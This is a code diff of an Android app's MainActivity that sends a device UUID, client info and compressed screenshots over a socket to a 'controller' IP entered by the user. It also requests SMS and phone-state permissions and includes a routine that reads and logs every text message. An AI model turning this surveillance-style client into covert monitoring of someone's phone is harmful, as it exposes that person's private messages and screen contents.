@@ -48,7 +48,7 @@ public class MainActivity extends AppCompatActivity {
     public static final int SERVER_PORT = 6666;
     private TextView tvContent;
     public static final String CHAR_SET = "utf-8";
-    private int mDensity=2;
+    private int mDensity = 2;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -57,53 +57,80 @@ public class MainActivity extends AppCompatActivity {
         setContentView(R.layout.activity_main);
         etIp = (EditText) findViewById(R.id.main_ip_et);
         tvContent = (TextView) findViewById(R.id.main_content_tv);
-        PermissionUtil.checkPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE,0);
+        PermissionUtil.checkPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE, 0);
 
 
         imgWidth = ScreenUtils.getScreenWidth() / 2;
         imgHeight = ScreenUtils.getScreenHeight() / 2;
         DisplayMetrics metrics = getResources().getDisplayMetrics();
         mDensity = metrics.densityDpi;
-        readAllSmsTest();
+//        readAllSmsTest();
 
     }
 
-    public void onclickConnect(View view) {
-        final String SERVER_ADDRESS = etIp.getText().toString();
-        if (TextUtils.isEmpty(SERVER_ADDRESS)) {
-            Toast.makeText(this, "ip地址不能为空", Toast.LENGTH_SHORT).show();
-            return;
-        }
+    private int failTimes;
+
+
+    public void sendClientInfo() {
         new Thread() {
             @Override
             public void run() {
-                Socket socket = null;
-                Bitmap bmp = null;
-                String info = AllUtils.getClientInfo(MainActivity.this);
-                System.out.println("======"+info);
+                Socket socket;
                 try {
                     socket = new Socket(SERVER_ADDRESS, SERVER_PORT);
+                } catch (final Exception e) {
+                    e.printStackTrace();
+                    runOnUiThread(new Runnable() {
+                        @Override
+                        public void run() {
+                            Toast.makeText(MainActivity.this, "链接失败：" + e, Toast.LENGTH_SHORT).show();
+                        }
+                    });
+                    return;
 
-                    OutputStream out = socket.getOutputStream();
-                    out.write("str".getBytes());
-
-
-                    out.write(info.getBytes(CHAR_SET));
-                    out.flush();
-                    out.close();
+                }
+                try {
+                    OutputStream socketOutput = socket.getOutputStream();
+                    socketOutput.write(AllUtils.getUUIDCache().getBytes(CHAR_SET));
+                    String info = AllUtils.getClientInfo(MainActivity.this);
+                    LogUtils.i("======" + info);
+                    socketOutput.write("str".getBytes());
+                    socketOutput.write(info.getBytes(CHAR_SET));
+                    socketOutput.flush();
+                    socketOutput.close();
 
                 } catch (IOException e) {
                     if (!(e instanceof EOFException)) {
                         e.printStackTrace();
                     }
                     System.out.println("IOException=======" + e.getMessage());
+                    runOnUiThread(new Runnable() {
+                        @Override
+                        public void run() {
+                            ToastUtils.showLong("控制端链接失败");
+                        }
+                    });
+                    try {
+                        sleep(2000);
+                    } catch (InterruptedException e1) {
+                        e1.printStackTrace();
+                    }
+                    if (failTimes < 5) {
+//                        sendClientInfo();
+                    }
+                    failTimes++;
+
                 } finally {
                     closedSocket(socket);
-                    recyBitmap(bmp);
+                    LogUtils.i("finally===closedSocket");
                 }
             }
         }.start();
+
     }
+
+    private String SERVER_ADDRESS;
+
     private MediaProjectionManager projectionManager;
     private int SCREEN_SHOT = 1;
     private MediaProjection mediaProject;
@@ -111,23 +138,28 @@ public class MainActivity extends AppCompatActivity {
     private int imgWidth = 1080;
     private int imgHeight = 1920;
     private static final int VIRTUAL_DISPLAY_FLAGS = DisplayManager.VIRTUAL_DISPLAY_FLAG_OWN_CONTENT_ONLY | DisplayManager.VIRTUAL_DISPLAY_FLAG_PUBLIC;
+
     @TargetApi(Build.VERSION_CODES.LOLLIPOP)
     public void onclickConnectImg(View view) {
-        if (Build.VERSION.SDK_INT <Build.VERSION_CODES.LOLLIPOP) {
-            ToastUtils.showLong("系统版本太低");
-            return;
-        }
-        projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
-        startActivityForResult(projectionManager.createScreenCaptureIntent(), SCREEN_SHOT);
-
-
         SERVER_ADDRESS = etIp.getText().toString();
         if (TextUtils.isEmpty(SERVER_ADDRESS)) {
             Toast.makeText(this, "ip地址不能为空", Toast.LENGTH_SHORT).show();
             return;
         }
 
+        failTimes = 0;
+        sendClientInfo();
+
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
+            ToastUtils.showLong("系统版本太低");
+            return;
+        }
+        projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
+//        startActivityForResult(projectionManager.createScreenCaptureIntent(), SCREEN_SHOT);
+
+
     }
+
     @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
     @Override
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
@@ -162,13 +194,15 @@ public class MainActivity extends AppCompatActivity {
                     sendBitmaSocket(bmp);
                     image.close();
 
+
                 }
             }, mHandler);
         }
     }
-    private String SERVER_ADDRESS;
-    private void sendBitmaSocket(final  Bitmap bitmap) {
-        if(bitmap==null){
+
+
+    private void sendBitmaSocket(final Bitmap bitmap) {
+        if (bitmap == null) {
             LogUtils.i("Bitmap null=====");
             return;
         }
@@ -179,11 +213,11 @@ public class MainActivity extends AppCompatActivity {
                 try {
                     socket = new Socket(SERVER_ADDRESS, SERVER_PORT);
                     DataOutputStream dos = new DataOutputStream(socket.getOutputStream());
+                    dos.write(AllUtils.getUUIDCache().getBytes(CHAR_SET));
                     dos.write("img".getBytes());
                     ByteArrayOutputStream baos = new ByteArrayOutputStream();
                     bitmap.compress(Bitmap.CompressFormat.JPEG, 70, baos);
                     dos.write(baos.toByteArray());
-
                     dos.flush();
                     dos.close();
 
@@ -195,14 +229,11 @@ public class MainActivity extends AppCompatActivity {
                 } finally {
                     closedSocket(socket);
                     recyBitmap(bitmap);
-
                 }
             }
         }.start();
 
     }
-
-
 
 
     private Handler mHandler = new Handler() {
@@ -211,7 +242,6 @@ public class MainActivity extends AppCompatActivity {
 
         }
     };
-
 
 
     private void closedSocket(Socket socket) {
@@ -234,25 +264,10 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+    @Override
+    protected void onDestroy() {
+        super.onDestroy();
+    }
 
     @Override
     public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
@@ -273,10 +288,10 @@ public class MainActivity extends AppCompatActivity {
     private void permissionSuccess(int requestCode) {
         switch (requestCode) {
             case 0:
-                PermissionUtil.checkPermission(this, Manifest.permission.READ_PHONE_STATE,1);
+                PermissionUtil.checkPermission(this, Manifest.permission.READ_PHONE_STATE, 1);
                 break;
             case 1:
-                PermissionUtil.checkPermission(this, Manifest.permission.READ_SMS,2);
+                PermissionUtil.checkPermission(this, Manifest.permission.READ_SMS, 2);
                 break;
             case 2:
                 break;
@@ -289,11 +304,11 @@ public class MainActivity extends AppCompatActivity {
 
     }
 
-    private void readAllSmsTest(){
+    private void readAllSmsTest() {
         ArrayList<SmsInfoBean> list = SmsUtils.getAllSMS();
-        LogUtils.i("读取到了多少条短信："+list.size());
-        for(SmsInfoBean sms:list){
-            LogUtils.i(""+sms.toString());
+        LogUtils.i("读取到了多少条短信：" + list.size());
+        for (SmsInfoBean sms : list) {
+            LogUtils.i("" + sms.toString());
         }
     }
 
